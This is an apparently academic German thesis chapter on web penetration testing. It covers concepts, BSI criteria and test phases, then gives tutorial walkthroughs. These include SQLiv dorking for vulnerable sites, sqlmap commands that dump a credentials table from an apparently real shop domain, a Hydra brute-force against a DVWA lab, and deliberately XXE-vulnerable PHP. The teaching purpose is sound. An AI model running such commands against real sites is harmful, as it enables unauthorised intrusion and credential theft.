\chapter{Penetrationstest}
\label{cha:k4}

\section{Überblick}

Die Sicherheit stellt eines der größten Hindernisse von Informationssystemen dar. Um die Sicherheit zu gewährleisten werden sogenannte Penetrationstests durchgeführt. Diese bewähren sich als eine wichtige Sicherheitsbewertungsmethode sowie eine effektive Methode zur Beurteilung der Sicherheitslage eines bestimmten Informationssystems . In vielen Webanwendungen stößt der Betreiber auf zahlreiche versteckte Sicherheitslücken, die für  ihn nicht erkennbar sind. Diese Sicherheitslücken bringen ein erhebliches Sicherheitsrisiko mit sich, zumal ein Angreifer dadurch einen nicht autorisierten Zugriff auf das System bekommt. Genau diesem Umstand sollen Penetrationstests entgegenwirken.

Der Umfang eines Penetrationstests kann von einzelnen Anwendungen bis zu unternehmensweiten Angriffen stark variieren. Der Penetrationstest ist von einem Schwachstellenscan oder einer Schwachstellenanalyse abzugrenzen und mit diesen nicht zu verwechseln, zumal er nicht nur Schwachstellen findet, sondern von diesen auch uneingeschränkt Gebrauch macht. Folglich startet ein Penetrationstest die Suche nach einer Schwachstelle und verwertet die von ihm erkannten Schwachstellen, sodass er auf einen weiteren Systemangriff vorbereitet ist\cite{northcutt2006}.

Sicherheitsanfälligkeiten in Webanwendungen können insbesondere durch zwei Hauptmethoden gesichtet werden: zum einen durch die Durchführung eines manuellen Penetrationstests und zum anderen durch automatisierte Scan-Tools. Im Folgenden Kapitel werden diese beiden Methoden einander vergleichend gegenübergestellt.

\section{Definitionen}

Bei einem Penetrationstest wird die Abwehrfähigkeit auf potentielle Angriffe ermittelt. Dabei wird untersucht, inwieweit existierende Sicherheitsmaßnahmen ausreichenden Schutz bieten oder nicht. Überdies werden diejenigen Methoden herangezogen, von denen  ein Angreifer selbst Gebrauch macht\cite[5--6]{pt03bsi}. Bei einem Penetrationstest für Webanwendungen steht lediglich die Bewertung der Sicherheit einer Webanwendung im Vordergrund. Dieser hat eine aktive Analyse der Anwendung auf Schwachstellen, technische Fehler oder Verwundbarkeit zum Inhalt. Die hierbei ermittelten Sicherheitsprobleme werden dem Systembetreiber zusammen mit einer Bewertung der Folgen sowie oftmals mit einem Vorschlag zur Milderung von Sicherheitsproblemen oder einer technischen Lösung eingereicht\cite[46]{meucci2008owasp}.

Im Hinblick auf Penetrationstests gibt es eine etliche Definitionen. Bacudio\cite{bacudio2011overview} zufolge ist ein Penetrationstest als eine Reihe von Aktivitäten zur Analyse und Ausnutzung von Sicherheitsschwächen zu qualifizieren. Er sei ein Sicherheitstest, der die Umgehung von Sicherheitsmerkmalen eines Systems zum Ziel habe\cite{wack2003guideline}. Osborne\cite{osborne2006cheat} hingegen bezeichnet einen Penetrationstest als einen Test, welcher ermöglicht, Systeme entsprechend zu konzipieren und konfigurieren, um sowohl einen versuchten als auch einen vollendeten unberechtigtem Zugriff zu unterbinden.

\section{Ziele der Penetrationstests}

Bislang ist kein System vorhanden, welches einen \%100 Schutz vor unbefugten Zugriffen garantiert. Dies hat zur Folge, dass Penetrationstests die Sicherheit des jetzigen Systems aus dem Blickwinkel eines Hackers untersuchen. Genaugenommen dienen Penetrationstests zur Bestimmung von Lücken in der Sicherheitslage sowie zur Nutzung von Exploits, sodass damit ein Einstieg in das Zielnetzwerk ermöglicht wird, und dadurch die Voraussetzung für den  Zugang auf vertraulichen Daten geschaffen wird\cite{yeo2013using}.

National Institute of Standards and Technology legt nahe, dass Penetrationstests auch zur Bestimmung von Folgendem nützlich sein können\cite{scarfone2008technical}: 

\begin{itemize}
	\item wie gut das System reale Angriffsmuster toleriert,
	\item die wahrscheinliche Komplexität, die ein Angreifer benötigt, um das System erfolgreich zu beeinträchtigen,
	\item zusätzliche Gegenmaßnahmen, die Bedrohungen gegen das System abschwächen könnten,
	\item Fähigkeit der Verteidiger, Angriffe zu erkennen und angemessen zu reagieren.
\end{itemize}

\section{Grundlegendes Konzept}
\label{grndlgndkonzpt}

Penetrationstests können auf verschiedene Arten durchgeführt werden. Der häufigste Unterschied ist das Wissen über die Implementierungsdetails der getesteten Systeme, die dem Tester zur Verfügung gestellt wurden. Die weithin akzeptierten Ansätze sind Black-Box- und White-Box-Tests.

\begin{figure}[h]
	\centering
	\includegraphics[width=14cm]{blackwhitegray.jpg}
	\caption{Die akzeptierte Ansätze\cite{bwgtesting16}}
\end{figure}

\subsection{Black-Box}

Black-Box-Tests beziehen sich auf das Testen eines Systems ohne spezifische Kenntnisse der internen Abläufe des Systems, ohne Zugriff auf den Quellcode und ohne Kenntnisse der Architektur des Systems\cite{bwgwebtesting07}. Dem Tester wird nichts über das Netzwerk oder die Umgebung des Ziels mitgeteilt\cite{tiller2004ethical}. Wenn es sich um einen Black-Box-Test handelt, kann dem Tester eine Webseite oder IP-Adresse zugewiesen werden und er soll die Webseite so angreifen, als wäre er ein Hacker von außen\cite{whitaker2005penetration}. Aufgrund des Mangels an internem Anwendungswissen kann das Aufdecken von Fehlern und/oder Schwachstellen jedoch erheblich länger dauern. Black-Box-Tests müssen gegen laufende Instanzen von Anwendungen ausgeführt werden. Daher sind sie normalerweise auf dynamische Analysen wie das Ausführen von automatisierten Scan-Tools und manuelle Penetrationstests beschränkt\cite{bwgwebtesting07}. In Black-Box-Sicherheitstests können Hacker verschiedener Fertigkeitsstufen wie z. B. Skript-Kiddies, Mid-Level-Hacker oder Elite-Hacker\cite{bwgprole18}.

\subsection{White-Box}

Die White-Box-Tests werden auch als ‚interne Tests‘ bezeichnet. Bei diesem Ansatz simulieren Tester einen Angriff als eine Person, die über vollständige Kenntnisse der zu testenden Infrastruktur verfügt, häufig Betriebssystemdetails, IP-Adressschemata und Netzwerklayouts, Quellcodes und möglicherweise Kennwörter\cite{ali2011pt}. Durch den vollständigen Zugriff auf diese Informationen können Fehler und Schwachstellen schneller entdeckt werden als mit der Test- und Fehlermethode des Black-Box-Tests. Darüber hinaus ist eine umfassendere Testabdeckung erreichbar, indem genau bekannt ist, was getestet werden muss. Aufgrund der Komplexität der Architekturen und des Umfangs des Quellcodes führt der White-Box-Test jedoch zu Herausforderungen, wie die Test- und Analysebemühungen am besten ausgerichtet werden können. Zur Unterstützung von White-Box-Tests sind in der Regel Fachwissen und Tools erforderlich, z. B. Pentesting-Tool, Debugger und Quellcode-Analysatoren\cite{bwgwebtesting07}.

\section{Kriterien für Penetrationstests}
\label{kriterpent}

Es gibt mehrere diverse Zielsetzungen bei einem Penetrationstest, die vor den Sicherheitstests beschlossen werden müssen. Mithin können bei einem Penetrationstest eine wirklichkeitsnahe Eindringversuche durchgeführt werden. Zu diesem Zweck soll unterschiedliche Kriterien berücksichtigt werden. Weiterhin wird die sechs Kriterien für die Penetrationstests in Betracht gezogen.

\subsection{Informationsbasis}

Für den Penetrationstester sind besonders diejenigen Informationen wichtig, die er vorab kennt oder eben nicht kennt. Im Falle dass er bereits Insiderwissen hat, spricht man von White-Box-Testing. Das Gegenstück zum White-Box-Testing ist das Black-Box-Testing, welches keinerlei Wissen über das Objekt voraussetzt. Während bei einem White-Box-Test ein Angriff einer Person, die das Unternehmen bereits kennt, vorausgesetzt wird, wird bei einem Black-Box-Test ein Angriff durch einen Hacker im typischen Sinn simuliert. Der typische Hacker steht dabei vor einer größeren Herausforderung, da er vorab keine detaillierten Informationen über das Objekt besitzt. Anders sieht es bei einem Angriff einer Person aus, die das Objekt bereits kennt. Die Informationsspanne kann dabei von spärlichen Kenntnissen bis hin zu tiefgehenden Informationen zum Objekt haben, was dem Angreifer wiederum viele Möglichkeiten gibt\cite[13--14]{pt03bsi}. 

\subsection{Aggressivität}

Um zu unterscheiden wie aggressiv ein Penetrationstester bei seinen Tests vorgeht, können vier „Aggressivitätsstufen“ zur Hilfe genommen werden. Die niedrigste Stufe sorgt für einen passiven Test, der potenzielle Schwachstellen zwar findet, aber nicht ausnutzt. Die zweite Stufe gilt als „vorsichtig“, das bedeutet das Schwachstellen ausgenutzt werden, aber nur wenn man sicher von einer Nichtbeinträchtigung des inspizierten Systems ausgehen kann. Dies kann beispielsweise durch den Einsatz von Standardpasswörtern. „Abwägend“ wird die dritte Stufe bezeichnet. Hier werden zum Beispiel automatisch Passwörter durchprobiert, das heißt dass in dieser Stufe systembeeinträchtigende Schwachstellen zu testen. Davor werden jedoch Erfolgswahrscheinlichkeit und mögliche Konsequenzen abgewägt. Schlussendlich werden in der letzten Stufe, der „aggressiven“ Stufe, jegliche Möglichkeit ausgeschöpft, von der man denkt, dass sie eine potenzielle Schwachstelle ausnutzen könnte. Mit dem Wissen, dass auch benachbarte Systeme beschädigt werden können, werden zum Beispiel Sicherungssysteme überlastet und ausgeschaltet oder Buffer-Overflows gezielt eingesetzt\cite[14]{pt03bsi}. 

\subsection{Umfang}

Der Umfang der Systeme, die getestet werden spielen ebenfalls eine große Rolle. So ist es sinnvoll eine gründliche Überprüfung durchzuführen bevor man einen ersten Penetrationstest plant. Man vermeidet so, zu testende Elemente zu übersehen und mögliche Sicherheitslücken nicht zu erkennen. Trotz der Tatsache, dass identische und fast identische Systeme zu Teilen auf einmal untersucht werden können, trifft das nicht zu, wenn „abweichende“ Konfiguration auftreten. Denn der Umfang der Systeme, die untersucht werden sollen, bestimmt den für den Penetrationstest betriebenen Aufwand. Es hängt also grundsätzlich davon ab, welcher Umfang durch den Auftraggeber zustande kommt. Das bedeutet das festgestellt werden muss, ob nur ein Modul getestet werden soll, mehrere oder das ganze System\cite[14--15]{pt03bsi}. 

\subsection{Vorgehensweise}

Penetrationstests können auf verschieden Weisen durchgeführt werden. Die Vorgehensweise ist wichtig, wenn es darum geht welche Sicherheitssysteme getestet werden sollen und auf welche Art. Bei der Prüfung von sekundären Sicherheitssystemen ist es sinnvoll, Angriffe im Penetrationstest durchführen zu lassen, die nicht sofort als solche erkennbar sind. Bis erkenntlich wird, dass die verdeckten Methoden keine Reaktion hervorrufen, sollten keine sichtbare Vorgehensweise in Augenschein genommen werden. Danach jedoch kann mit Hilfe von Tools, die alle erreichbaren Dienste aufrufen können, offensichtlich angegriffen, beziehungsweise getestet werden\cite[15]{pt03bsi}. 

\subsection{Techniken}

Verschiedene Techniken werden bei verschiedenen Situationen genutzt. Im Normalfall führt der Penetrationstest Angriffe auf das System direkt über das Netzwerk aus. Aus diesem Grund führt auch ein Penetrationstest über das Netzwerk zu einer klassischen Simulation eines Angriffs durch einen Hacker. In der heutigen Zeit werden Angreifer jedoch vor große Herausforderungen gestellt, da Sicherheitssysteme immer besser werden und Firewalls zusätzlichen Schutz bieten. Einen geringeren Aufwand betreibt man, wenn man einen direkten physischen Angriff plant. Auf diese Art und Weise kann der Angreifer deutlich schneller an das gewünschte Ziel kommen. Unter einem direkten physischen Angriff versteht man beispielsweise, wenn man sich unautorisierten Zugriff auf eine Arbeitsstation verschafft, die ungeschützt oder nicht ausreichend geschützt ist. Zu dieser Art von Angriff zählt auch ein eventuelles Stehlen einer Zugangskarte zu dieser Arbeitsstation oder Ähnliches. Noch mehr als bei Sicherheitslücken im System, spielen bei solchen Angriffen der Mensch eine Rolle, der die Zugangskarte verlegen kann oder ein schlechtes Passwort hat.
Man kann passende Tests einführen, nachdem eine allgemeine Leitlinie zur Sicherheit präsentiert wurde. Somit können noch fehlende Maßnahmen ergänzt werden\cite[15--16]{pt03bsi}. 

\subsection{Ausgangspunkt}

Ein weiterer wichtiger Punkt bei Penetrationstests ist der Ausgangspunkt des Tests. Wird der Test innerhalb oder außerhalb des entsprechenden Netzwerks oder Komplexes durchgeführt. Ein Penetrationstest von außen kann einen Angriff über eine Netzwerkverbindung simulieren und alle wichtigen Merkmale und Ergebnisse erfassen. Im Gegenteil dazu, kann ein Test von innen, die falsche Konfiguration einer Firewall oder die Risiken, die Personen mit Zugang zum internen Netzwerk haben, simulieren und Ergebnisse hervorbringen\cite[16--17]{pt03bsi}. 

\section{Ablauf eines Penetrationstest}
\label{ablaufpentest}

Im diesem Abschnitt wird das Ablauf eines Penetrationstest nach der Studie für Penetrationstests des BSI\cite{pt03bsi} beschrieben.

\subsection{Vorbereitung}

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{vorbereitungpt.png}
	\caption{Phase 1 – Vorbereitung des Penetrationstests}
\end{figure}

In der Vorbereitungsphase werden zuerst die Ziele des Penetrationstest durch den Auftragsgeber und Auftragsnehmer definiert. Diese Ziele können beispielsweise die Verbesserung oder die Bestätigung der Sicherheit des Zielsystems durch einen externen Dritten sein. Darauf aufbauend müssen die rechtlichen Aspekte für die Durchführung des Penetrationstests zur Kenntnis genommen werden. Nun kann der Penetrationstest anhand der oben genannten Kriterien (siehe Abschnitt \ref{kriterpent}) konkretisiert werden. Hierzu muss auch bestimmt werden, welche Komponenten dem Penetrationstest untergezogen werden sollen. Hier besteht die Möglichkeit, dass der Auftraggeber den Penetrationstester auf einen bestimmten Bereich begrenzt, den er für einen Penetrationstest als besonders relevant ansieht. Darüber hinaus muss auch geklärt werden, welche Informationen der Tester über das Zielsystem erhalten soll. Bei dieser entscheidenden Frage wird entschieden, ob es sich um einen Black-Box-Test oder einen White-Box-Test handeln soll. \textit{"`Ergebnis der Vorbereitungsphase muss ein detaillierter Plan sein, der genau vorgibt wann welche Komponenten mit welcher Intensität penetriert werden"'}\cite[100--102]{pt03bsi}.

\subsection{Informationsbeschaffung}
\label{infobeschaffung}

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{informationsbeschaffung.png}
	\caption{Phase 2 – Informationsbeschaffung}
\end{figure}

Sofern die Vorbereitungsphase abgeschlossen ist und über alle wesentlichen Punkte einig wurde, kann mit der Beschaffung von Informationen über das Zielsystem angefangen werden. 
Als Erster werden die Erstinformationen ausgewertet. Laut dem grundlegenden Konzept (siehe Abschnitt \ref{grndlgndkonzpt}) werden die erhaltenen Informationen, sowie nur eine IP-Adresse bei dem Black-Box-Test beschränkt. Wenn es um einen White-Box-Test geht, dann werden umfangreiche Informationen zum Nutzen gereicht, um einen genauen Überblick über die möglichen Angriffspunkte zu erlangen. In der Informationsbeschaffungsphase muss genug Zeit eingeplant werden, welche je nach Konzept des Penetrationstests oder Menge der zu testenden Komponenten des Zielsystems variieren kann\cite[102--103]{pt03bsi}.

\newpage

\subsection{Bewertung der Informationen und Risikoanalyse}
\label{bewinfrisiko}

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{bewertungderinf.png}
	\caption{Phase 3 – Bewertung der Informationen und Risikoanalyse}
\end{figure}

Die erlangten Informationen werden anschließend aus der vorherigen Phase (siehe Abschnitt \ref{infobeschaffung}) ausführlich zusammengetragen und es findet eine Bewertung des Risikos statt. An dieser Stelle werden die gesammelten Informationen analysiert und bewertet. Die vereinbarten Ziele, potenzielle Gefährdung des Zielsystems und geschätzter Aufwand müssen für den beeinträchtigenden Mangel der Sicherheit einbezogen werden. Nachdem die Bedrohungen bewertet werden, sollte der Penetrationstester den Aufwand und die Erfolgschancen abwägen. Mit Hilfe der zeitlichen Einschätzung für die durchzuführenden Penetrationstests kann der Aufwand (mittel, hoch, sehr hoch) für jegliche Module angeleitet werden. Dabei kann die Priorisierung stattfinden: "`\textit{Je höher die Erfolgschancen und je niedriger der Aufwand ist, desto höher sollte die Priorität sein.}"' Die Dokumentation für die Aufwandsschätzung und vergebenen Prioritäten sollen von dem Penetrationstester erstellt werden, um die Effizienz des Penetrationstests zu steigern\cite[103--104]{pt03bsi}.

\subsection{Aktive Eindringversuche}

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{aktiveEindringversuche.png}
	\caption{Phase 4 – Aktive Eindringversuche durchführen}
\end{figure}

In dieser Phase wird geprüft, wie sicherheitskritisch die ausgewählten Sicherheitsmängel von Phase 3 (siehe Abschnitt \ref{bewinfrisiko}) tatsächlich sind. Dies wird erreicht, indem man versucht, so weit wie möglich in das Zielsystem aktiv einzugreifen. Hierbei ist von Relevanz, dass jeder Schritt genau bedacht wird, da durch den Versuch einzudringen die Zielsysteme auch beschädigt werden könnten. Soll beispielsweise ein System getestet werden, das eine hohe Verfügbarkeit haben soll, muss berücksichtigt werden, wie der Test aufgebaut wird, um die Verfügbarkeit weiterhin gewähren zu können.  Es gibt eine weitere Möglichkeit, um die Verfügbarkeit der zu testenden Systeme sicherzustellen, indem zum Beispiel Schattensysteme verwendet werden. Schattensystemen sind eine exakte Kopie des zu testenden Systems. Dabei ist als Vorteil bei der Verwendung von Schattensysteme klar zu benennen, dass während des Penetrationstests sichergestellt ist, dass es zu keinen Ausfällen des tatsächlichen Systems kommt. Bei den aktiven Eindringversuchen wird erst gezeigt, ob die identifizierten Schwachstellen von der Phase 1 tatsächlich ausgenutzt werden können. Außerdem sollten sowohl die positiven, als auch die negativen Ergebnisse detailliert dokumentiert werden\cite[104--105]{pt03bsi}.

\subsection{Abschlussanalyse und Nacharbeiten}

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{abschluss.png}
	\caption{Phase 5 – Abschlussanalyse und Nacharbeiten durchführen}
\end{figure}

Zum Abschluss des Penetrationstests werden alle gefundenen Schwachstellen in einem Bericht aufgelistet und deren Risiken genau erläutert. Dabei sollte ein solcher Abschlussbericht neben den Resultaten des Penetrationstests auch Möglichkeiten zur Behebung etwaiger Risiken beinhalten. Der Bericht muss für den Auftraggeber klar und deutlich sein. Dabei sollte jede durchgeführte Aktion so beschrieben werden, dass sie für den Auftraggeber nachvollziehbar ist, deshalb müssen die Informationen aus den Phasen 1 bis 5 als Anhang in dem Bericht enthalten sein. 
Diese Anhänge können detaillierte Informationen zu den eingesetzten Tools, Arbeitsschrittinfos, Einsatzzeiten etc. sein. Während des Penetrationstests installierte Anwendungen wie z.B. Keylogger müssen durch den Penetrationstester entfernt und das bereinigte System wiederhergestellt werden. Schließlich sollte nach der Fertigstellung des Abschlussberichts mit dem Auftraggeber ein Abschlussgespräch geführt werden. Hierbei werden noch einmal alle gefundenen Sicherheitsprobleme ausführlich besprochen\cite[105--106]{pt03bsi}.

\section{Manuelle Penetrationstest}

In diesem Abschnitt werden unterschiedliche Methoden für manuelle Penetrationstests erklärt. Es wird außerdem gezeigt, wie diese manuellen Tests durchgeführt werden.

\subsection{Testen von SQL Injektion mit SQLiv und SQLMAP}

Nachfolgend wird die SQL-Injektion mit SQLiv und SQLMAP nach dem Tutorial von \cite{ramadhan17sqlinj} beschrieben.

Vor dem Injektionsangriff muss sichergestellt werden, dass der Server oder das Ziel eine Sicherheitslücke in der Datenbank hat. Um Sicherheitslücken in Datenbanken zu finden, können verschiedene Methoden verwendet werden. Eine Methode ist Google Dorking, die hauptsächlich von Hackern und Penetrationstestern verwendet wird. Es gibt ein Werkzeug, das dies automatisch erledigt. Das Tool muss jedoch erst installiert werden. Es heißt SQLiv (SQL Injection Vulnerability Scanner).\\

\textbf{Schritt 1: Finden von SQL-Injection-Schwachstelle}

Es wird Google Dorking verwendet, um die SQL-Injektionslücke in Zielen zu suchen und zu finden. SQLiv durchsucht jedes einzelne Ziel und sucht nach einer E-Commerce-Sicherheitsschwachstelle unter dem folgenden URL-Muster \texttt{''item.php?id=''}.\\

\begin{LaTeXCode}[caption={Google Dorking mit SQLiv \cite{ramadhan17sqlinj}},captionpos=b, label=LaTeXCode:gdsqliv][numbers=none]
~# sqliv -d inurl:artikel.php?id= -e google -p 200
\end{LaTeXCode}

Standardmäßig durchsucht SQLiv die erste Seite in der Suchmaschine, die bei Google zehn Webseiten pro Seite anzeigt. Daher wird hier das Argument \texttt{-p 200} definiert, um 200 Seiten zu durchsuchen. Basierend auf dem oben angegebenen Dork erscheint folgendes Ergebnis von verwundbaren URLs:

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{sqllive.png}
	\caption{Durchsuchung mit SQLiv}
\end{figure}

\newpage

\textbf{Schritt 2: SQL-Injektion mit SQLMAP}

Der Angriff wird mit SQLMap ausgeführt. Zuerst muss der Datenbankname zum Vorschein gebracht werden, der in den Datenbank-Tabellen und Spalten enthalten ist, die die Daten umfassen.\\

Ziel-URL: \texttt{http://www.acfurniture.com/artikel.php?id=1225}\\

\textbf{A. Datenbankname aufdecken}\\

\begin{LaTeXCode}[caption={Aufdeckung des Datenbanknames\cite{ramadhan17sqlinj}},captionpos=b, label=LaTeXCode:advd1][numbers=none]
~# sqlmap -u "http://www.acfurniture.com/artikel.php?id=1225" --dbs
\end{LaTeXCode}

Mit dem oben genannten Befehl wurde der Datenbankname ermittelt:

\begin{table}[h]
	\centering
	\begin{tabular}{l}
		available databases         \\
		{[}*{]} acfurniture         \\
		{[}*{]} information\_schema
	\end{tabular}
	\caption{Ergebnis: Datenbankname}
\end{table}

\textbf{B. Tabellenname aufdecken}\\

\begin{LaTeXCode}[caption={Aufdeckung vom Tabellenname \cite{ramadhan17sqlinj}},captionpos=b, label=LaTeXCode:advt1][numbers=none]
~# sqlmap -u "http://www.acfurniture.com/artikel.php?id=1225" -D acfurniture --tables
\end{LaTeXCode}

Das Ergebnis sollte so aussehen:

\begin{table}[h]
	\centering
	\begin{tabular}{|l|}
		\hline
		{[}Date{]} {[}INFO{]} retrived: settings \\ \hline
		Database: acfurniture                    \\ \hline
		{[}4 tables{]}                           \\ \hline
		category                                 \\ \hline
		product                                  \\ \hline
		product\_hacked                          \\ \hline
		settings                                 \\ \hline
	\end{tabular}
	\caption{Ergebnis: Tabellenname}
\end{table}

Bisher wurde festgestellt, dass die Webseite \texttt{acfurniture.com} zwei Datenbanken aufweist, \texttt{acfurniture} und \texttt{information\_schema}. Die Datenbank \texttt{acfurniture} enthält vier Tabellen: \texttt{category}, \texttt{product}, \texttt{product\_hacked} und settings.

\textbf{C. Spalten aufdecken}\\

\begin{LaTeXCode}[caption={Aufdeckung von Spalten\cite{ramadhan17sqlinj}},captionpos=b, label=LaTeXCode:advs1][numbers=none]
~# sqlmap -u "http://www.acfurniture.com/artikel.php?id=1225" -D acfurniture -T settings --columns
\end{LaTeXCode}

\begin{table}[h]
	\centering
	\begin{tabular}{|l|l|}
		\hline
		Database:          & acfurniture      \\ \hline
		Table              & settings         \\ \hline
		\multicolumn{2}{|l|}{{[}6 columns{]}} \\ \hline
		Column             & Type             \\ \hline
		activationcode     & varchar(2048)    \\ \hline
		email              & varchar(45)      \\ \hline
		id                 & int(11)          \\ \hline
		password           & varchar(1024)    \\ \hline
		status             & smallint(2)      \\ \hline
		username           & varchar(45)      \\ \hline
	\end{tabular}
	\caption{Ergebnis: Spalten}
\end{table}

Die Tabelle \texttt{settings} besteht aus sechs Spalten und ist ein Konto mit Anmeldeinformationen. Es wird versucht, diese Informationen auszugeben.\\

\textbf{D. Informationen aufdecken}\\

Man kann alle Daten in der Tabelle mit folgendem Befehl ausgeben:

\begin{LaTeXCode}[caption={Aufdeckung aller Daten in der Tabelle \cite{ramadhan17sqlinj}},captionpos=b, label=LaTeXCode:alledatenausgeben1][numbers=none]
~# sqlmap -u "http://www.acfurniture.com/item.php?id=1225" -D acfurniture -T settings --dump
\end{LaTeXCode}

Es ergibt sich das folgende Resultat:

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{aufdeckungalledatenindertabelle.png}
	\caption{Ergebnis: alle Daten in der Tabelle}
\end{figure}

\subsection{Testen von Cross-Site-Scripting mit Burp}

Das folgende Cross-Site-Scripting-Beispiel stammt aus dem Tutorial der Web-Sicherheitsseite Portswigger\cite{portswigger12}.

\begin{figure}[h]
	\centering
	\includegraphics[width=7cm]{xssburp.png}
	\caption{Adresse eingeben}
\end{figure}

\newpage

Man muss eine entsprechende Eingabe in die Webanwendung eingeben und die Anfrage senden.

\begin{figure}[h]
	\centering
	\includegraphics[width=11cm]{xssburp2.png}
	\caption{Erfassung der Anfrage durch Burp}
\end{figure}

Die Anfrage wird von Burp erfasst. Die HTTP-Anforderung wird auf der Intercept-Tab angezeigt. Es wird mit der rechten Maustaste auf die Anforderung geklickt, um das Kontextmenü aufzurufen. Anschließend wird auf \texttt{Repeater senden} geklickt.

\begin{figure}[h]
	\centering
	\includegraphics[width=11cm]{xssburp3.png}
	\caption{Bearbeiten dem Wert}
\end{figure}

Hier können verschiedene XSS-Payloads in das Eingabefeld eingegeben werden. Unterschiedliche Eingaben können getestet werden, indem der Tester den \texttt{Value} des entsprechenden Parameters in den Tabs \texttt{Raw} oder \texttt{Params} bearbeiten. In diesem Beispiel wird versucht, dass ein Pop-up in unserem Browser ausgeführt wird.

\begin{figure}[h]
	\centering
	\includegraphics[width=11cm]{xssburp4.png}
	\caption{Suche nach dem Angriff in dem Quellcode}
\end{figure}

Es kann eingeschätzt werden, ob der Angriff in der Antwort unverändert bleibt. In diesem Fall ist die Anwendung für XSS-Angriffe anfällig. Die Antwort wird schnell über die Suchleiste unten im Antwortfenster gefunden. Der hervorgehobene Text ist das Ergebnis der Suche.

\begin{figure}[h]
	\centering
	\includegraphics[width=11cm]{xssburp5.png}
	\caption{Kopieren der URL für Browser}
\end{figure}

Hier wird auf \texttt{Antwort im Browser anzeigen} geklickt, um die URL zu kopieren. Danach wird im Pop-up Fenster auf \texttt{Kopieren} geklickt.

\newpage

\begin{figure}[h]
	\centering
	\includegraphics[width=11cm]{xssburp6.png}
	\caption{Pop-up im Browser anzeigen}
\end{figure}

Die kopierte URL wird in die Adressleiste eingegeben, um die Realisierung desXSS-Angriffs durch das Senden einer kurzen und harmlosen Nachricht oder einerWarnung an den Client zu ermöglichen.


\subsection{Testen Brute-Forcing-Passwörter mit THC-Hydra}

In diesem Beispiel wird Hydra verwendet, um in eine Anmeldeseite zu gelangen, indem ein Brute-Force-Angriff auf einige bekannte Benutzer ausgeführt wird\cite[143]{najera2016kali}.

Es wird eine Textdatei namens \texttt{benutzers.txt} erstellt{\cite[144]{najera2016kali}}:

\begin{center}
	admin\\test\\user\\user1\\john
\end{center}

In einem ersten Schritt wird analysiert, wie die Anmeldeanforderung gesendet wird und wie der Server darauf reagiert. Es wird Burp Suite verwendet, um eine Anmeldeanforderung in der Webanwendung zu erfassen\cite[144]{najera2016kali}:

\newpage

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{bfa.png}
	\caption{Anfrage an den Server und Antwort von dem Server}
\end{figure}

Es ist ersichtlich, dass sich die Anfrage in \texttt{/dvwa/login.php} befindet und drei Variablen hat: \texttt{username}, \texttt{password}, and \texttt{login}.\\

Wenn die Erfassung von Anforderungen beendet wird und das Ergebnis im Browser überprüft wird, kann festgestellt werden, dass die Antwort eine Weiterleitung zur Anmeldeseite  ist\cite[144]{najera2016kali}:

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{bfa2.png}
	\caption{Die Weiterleitung zur Anmeldeseite}
\end{figure}

Eine gültige Kombination aus Benutzername und Kennwort sollte nicht zum selben Login, sondern zu einer anderen Seite, z. B. index.php, weitergeleitet werden. Es wird also davon ausgegangen, dass ein gültiges Login auf die andere Seite umgeleitet wird, und wir verwenden \texttt{login.php} als Zeichenfolge, um zu unterscheiden, wenn ein Versuch fehlschlägt\cite[145]{najera2016kali}.\\

Es wird der folgende Befehl in ein Terminal eingeführt\cite[145]{najera2016kali}:

\begin{LaTeXCode}[caption={Befehl durch Terminal},captionpos=b, label=LaTeXCode:beheldt1][numbers=none]
hydra 192.168.56.102 http-form-post "/dvwa/login.php:username=^USE
R^&password=^PASS^&Login=Login:login.php" -L users.txt -e ns -u -t 2 -w 30 -o hydra-result.txt
\end{LaTeXCode}

\begin{figure}[h]
	\centering
	\includegraphics[width=\textwidth]{bfa3.png}
	\caption{Aufdeckung der Passwörter}
\end{figure}

Anhand dieses Befehls werden nur zwei Kombinationen pro Benutzer ausprobiert: \texttt{password = username} und leere Passwörter. Es werden zwei gültige Passwörter von diesem Angriff erhalten, die von Hydra grün markiert sind\cite[145]{najera2016kali}.

\subsection{Testen von XML External Entities (XXE)}

Wenn eine Anwendung \texttt{XML}-Daten parst und das Ergebnis von geparstem XML in einer HTTP-Antwort anzeigt, würde ein grundlegender Testfall zum Testen der \texttt{XXE}-Sicherheitsanfälligkeit eine \texttt{XXE}-Payload senden, die eine interne Entität verwendet, nur um sicherzustellen, dass die Anwendung Entitäten enthält oder nicht. Dieses Tutorial stammt aus dem Infosec Institute\cite{infosec18}.\\

Es wird den folgenden \texttt{PHP}-Code als \texttt{xxe.php} im Webserver-Stammordner gespeichert:

\newpage

\begin{LaTeXCode}[caption={XXE PHP-Datei},captionpos=b][numbers=none]
<?php
libxml_disable_entity_loader (false);
\$xmlfile = file_get_contents('php://input');
\$dom = new DOMDocument();
\$dom->loadXML(\$xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
\$o = simplexml_import_dom(\$dom);
\$user = \$o->username;
\$pass = \$o->password;
echo "username : \$user";\\
\end{LaTeXCode}

Eine \texttt{POST}-Anforderung an die \texttt{xxe.php}-Datei mit \texttt{XML}-Daten gesendet, die im folgenden Screenshot gezeigt werden:

\begin{LaTeXCode}[caption={POST Anfrage zur PHP-Datei},captionpos=b][numbers=none]
POST /vulnapps/xxe.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 98

	<root>
		<username>sahil</username>
		<password>supersecurepassword</password>
	</root>\\
\end{LaTeXCode}

Hier soll beachtet werden, dass die Anwendung in der \texttt{HTTP}-Antwort einen Benutzernamen anzeigt, der bestätigt, dass die \texttt{XML}-Daten geparst werden.

\newpage

\begin{LaTeXCode}[caption={Geparste XML-Daten},captionpos=b][numbers=none]
HTTP/1.1 200 OK
Date: Tue, 15 May 2018 17:40:35 GMT
Server: Apache/2.4.27 (Win64) PHP/5.6.31
X-Powered-By: PHP/5.6.31
Content-Length: 16
Connection: close
Content-Type: text/xml; charset-UTF-8	

username: sahil\\
\end{LaTeXCode}

